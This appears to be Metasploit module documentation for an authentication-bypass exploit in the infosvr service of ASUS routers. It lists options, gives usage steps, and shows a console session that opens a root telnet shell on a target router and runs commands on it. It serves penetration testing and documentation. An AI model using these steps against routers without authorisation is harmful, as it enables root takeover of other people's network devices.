## Description

  This module exploits an authentication bypass vulnerability in the infosvr service running on various ASUS routers to execute arbitrary commands as `root`.


## Vulnerable Application

  The ASUS infosvr service is enabled by default on various models of ASUS routers and listens on the LAN interface on UDP port 9999. Unpatched versions of this service allow unauthenticated remote command execution as the `root` user.

  This module launches the BusyBox Telnet daemon on the port specified in the `TelnetPort` option to gain an interactive remote shell.

  This module was tested successfully on an ASUS RT-N12E with firmware version 2.0.0.35.

  Numerous ASUS models are [reportedly affected](https://github.com/jduck/asus-cmd), but untested.


## Verification Steps

  1. Start `msfconsole`
  2. `use exploit/linux/misc/asus_infosvr_auth_bypass_exec`
  3. `set RHOST [IP]`
  4. `run`
  5. You should get a *root* session


## Options


  **TelnetPort**

  The port for Telnetd to bind (default: `4444`)

  **TelnetTimeout**

  The number of seconds to wait for connection to telnet (default: `10`)

  **TelnetBannerTimeout**

  The number of seconds to wait for the telnet banner (default: `25`)

  **CommandShellCleanupCommand**

  A command to run before the session is closed (default: `exit`)

  If the session is killed (CTRL+C) rather than exiting cleanly,
  the telnet port remains open, but is unresponsive, and prevents
  re-exploitation until the device is rebooted.


## Scenarios

  ```
  msf > use exploit/linux/misc/asus_infosvr_auth_bypass_exec
  msf exploit(linux/misc/asus_infosvr_auth_bypass_exec) > set rhost 10.1.1.1
  rhost => 10.1.1.1
  msf exploit(linux/misc/asus_infosvr_auth_bypass_exec) > set telnetport 4444
  telnetport => 4444
  msf exploit(linux/misc/asus_infosvr_auth_bypass_exec) > set verbose true
  verbose => true
  msf exploit(linux/misc/asus_infosvr_auth_bypass_exec) > run 

  [*] 10.1.1.1 - Starting telnetd on port 4444...
  [*] 10.1.1.1 - Waiting for telnet service to start on port 4444...
  [*] 10.1.1.1 - Connecting to 10.1.1.1:4444...
  [*] 10.1.1.1 - Trying to establish a telnet session...
  [+] 10.1.1.1 - Telnet session successfully established...
  [*] Found shell.
  [*] Command shell session 1 opened (10.1.1.197:42875 -> 10.1.1.1:4444) at 2017-11-28 07:38:37 -0500

  id
  /bin/sh: id: not found
  # cat /proc/version
  cat /proc/version
  Linux version 2.6.30.9 (root@wireless-desktop) (gcc version 3.4.6-1.3.6) #2 Thu Sep 18 18:12:23 CST 2014
  # exit
  exit
  ```

